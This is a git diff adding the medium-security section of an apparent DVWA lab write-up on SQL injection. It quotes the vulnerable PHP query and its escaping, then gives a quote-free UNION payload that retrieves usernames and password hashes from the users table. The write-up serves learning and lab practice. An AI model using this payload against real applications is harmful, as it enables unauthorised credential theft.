@@ -78,3 +78,35 @@ The hashed password can be decoded.
 
 ## Security Level: Medium
 
+```bash
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+```
+
+In medium level security, the input id is directly used in the sql statement.
+Parameters like single quotes are escaped.
+
+```
+    $id = $_POST[ 'id' ];
+
+    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+```
+
+![image](https://github.com/user-attachments/assets/f5e83c21-85de-4c57-8c39-a6974a1d3576)
+
+
+Since we cant use single quote craft input without quotes:
+
+```bash
+1 or 1=1 UNION SELECT user,password FROM users#
+```
+
+![image](https://github.com/user-attachments/assets/69a4bc3e-984a-472c-b158-20abcbc9b63e)
+
+This successfully gets injected to the SQL source code, retriving data from users table.
+
+```bash
+SELECT firstname, lastname FROM users WHERE user_id = 1 or 1=1 UNION SELECT user,password FROM users#
+```
+
+![image](https://github.com/user-attachments/assets/6d69cc5b-cdf6-41ec-8b0f-13a950b9aa42)
+
